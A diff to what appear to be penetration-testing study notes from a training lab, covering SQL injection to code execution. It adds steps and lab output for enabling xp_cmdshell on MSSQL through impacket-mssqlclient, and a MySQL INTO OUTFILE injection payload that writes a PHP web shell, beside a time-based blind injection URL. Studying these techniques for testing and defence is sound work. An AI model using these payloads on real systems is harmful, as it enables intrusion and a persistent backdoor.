@@ -69,5 +69,45 @@ http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -
 
 
 
-
 #### MSSQL Code Execution
+To get RCE in `MSSQL` using the `xp_cmdshell`, a few conditions need to be met:
+- First, *show advanced options* needs to be set to `1`, and a `RECONFIGURE;` command needs to be issued.
+- Then, *xp_cmdshell* needs to be set to `1`, and a `RECONFIGURE;` command needs to be issued.
+From this point, the `xp_cmdshell` command is unlocked and can be used to get RCE.
+
+##### RCE with credentials
+```
+impacket-mssqlclient USERNAME:PASSWORD@IP_ADDRESS -windows-auth
+// MSSQL
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXECUTE xp_cmdshell 'COMMAND';
+```
+
+###### Example output
+```
+kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+...
+SQL> EXECUTE sp_configure 'show advanced options', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE;
+SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE;
+SQL> EXECUTE xp_cmdshell 'whoami';
+
+```
+
+
+#### MySQL Code Execution
+MySQL doesn't have any direct functions for running commands, but the `SELECT INTO_OUTFILE` functionality can be abused.
+Note: for this to work, the user running the database needs to have `write` permissions where the `OUTFILE` is stored.
+
+Example payload (might produce an error due to the return type, won't affect the result):
+```
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- -
+```
+This will write `<?php system($_GET['cmd']);>` into `/var/www/html/tmp/webshell.php`. 
